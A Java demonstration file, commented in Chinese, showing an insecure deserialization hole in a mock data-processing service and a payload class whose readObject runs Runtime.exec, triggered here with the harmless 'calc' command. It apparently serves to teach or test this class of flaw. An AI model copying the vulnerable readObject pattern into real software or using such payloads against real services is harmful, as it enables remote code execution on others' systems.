import java.io.*;
import java.util.*;

// 高抽象建模接口
interface DataProcessor {
    void process(byte[] data) throws Exception;
}

// 抽象数据模型
class DataModel implements Serializable {
    private String content;
    public DataModel(String content) { this.content = content; }
    public String getContent() { return content; }
}

// 不安全的反序列化实现
class SerializedDataProcessor implements DataProcessor {
    @Override
    public void process(byte[] data) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            // 漏洞点：直接反序列化不可信数据
            Object obj = ois.readObject();
            if (obj instanceof DataModel) {
                System.out.println("Processing: " + ((DataModel)obj).getContent());
            }
        }
    }
}

// 数据处理服务
class DataProcessingService {
    private DataProcessor processor;
    public DataProcessingService(DataProcessor processor) {
        this.processor = processor;
    }
    public void handleData(byte[] data) {
        try {
            processor.process(data);
        } catch (Exception e) {
            System.err.println("Error processing data: " + e.getMessage());
        }
    }
}

// 模拟攻击负载
class MaliciousPayload implements Serializable {
    private static final long serialVersionUID = 1L;
    private String cmd;
    public MaliciousPayload(String cmd) { this.cmd = cmd; }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟攻击执行
        Runtime.getRuntime().exec(cmd);
    }
}

// 测试类
public class VulnerableBigDataService {
    public static void main(String[] args) {
        try {
            // 初始化服务
            DataProcessingService service = new DataProcessingService(new SerializedDataProcessor());
            
            // 正常数据处理
            System.out.println("Normal operation:");
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(new DataModel("BigDataAnalysisResult"));
            oos.close();
            service.handleData(bos.toByteArray());
            
            // 模拟攻击注入
            System.out.println("\
Simulating attack injection:");
            bos = new ByteArrayOutputStream();
            oos = new ObjectOutputStream(bos);
            oos.writeObject(new MaliciousPayload("calc")); // Windows计算器
            oos.close();
            service.handleData(bos.toByteArray());
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}